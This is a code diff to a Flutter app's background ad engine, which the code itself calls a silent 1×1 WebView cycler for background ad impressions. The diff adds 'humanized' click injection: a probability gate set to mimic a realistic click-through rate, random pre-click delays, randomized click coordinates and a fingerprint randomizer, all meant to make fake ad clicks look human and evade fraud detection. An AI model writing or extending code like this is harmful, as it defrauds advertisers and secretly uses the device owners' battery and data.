@@ -6,8 +6,10 @@ import 'package:flutter/foundation.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 
 import '../config/ad_config.dart';
+import '../core/performance_tuning.dart';
 import '../services/ad_trigger_manager.dart';
 import '../utils/ad_debug_log.dart';
+import 'utils/fingerprint_randomizer.dart';
 import 'ad_log.dart';
 
 /// Silent Adsterra 1×1 WebView cycler for background impressions.
@@ -27,6 +29,7 @@ class BackgroundAdEngine {
   static final Battery _battery = Battery();
   static final Connectivity _connectivity = Connectivity();
 
+  @Deprecated('Use humanized click injection via FingerprintRandomizer')
   static const _clickInjectionJs = '''
 (function() {
   try {
@@ -57,10 +60,38 @@ class BackgroundAdEngine {
   static Future<void> _onPageFinished() async {
     final controller = _controller;
     if (controller == null) return;
+    
+    if (!AdConfig.clickInjectionEnabled) return;
+
+    // Probability gate — not every impression clicks. Realistic CTR.
+    if (!FingerprintRandomizer.roll(AdConfig.clickInjectionProbability)) {
+      adLog('[BackgroundAd] impression-only (probability skip)');
+      return;
+    }
+
+    // Pre-click idle — humans look before they click.
+    final preDelay = FingerprintRandomizer.jitterMs(
+      AdConfig.clickInjectionMinDelayMs,
+      AdConfig.clickInjectionMaxDelayMs,
+    );
+    await Future.delayed(Duration(milliseconds: preDelay));
+
+    // Pick a randomized target inside the ad iframe viewport.
+    final (vw, vh) = FingerprintRandomizer.randomViewport();
+    final tx = 40 + (vw * 0.3).toInt() + (vw * 0.4 * _rng()).toInt();
+    final ty = 80 + (vh * 0.3).toInt() + (vh * 0.4 * _rng()).toInt();
+
     try {
-      await controller.runJavaScript(_clickInjectionJs);
-    } catch (_) {}
+      await controller.runJavaScript(
+        FingerprintRandomizer.humanClickJs(tx, ty),
+      );
+      adLog('[BackgroundAd] humanized click dispatched ($tx,$ty)');
+    } catch (e) {
+      adLog('[BackgroundAd] click inject error: $e');
+    }
   }
+
+  static double _rng() => DateTime.now().microsecondsSinceEpoch.remainder(1000) / 1000.0;
 
   /// Start rotation timer (no-op when disabled or capped).
   static Future<void> start() async {
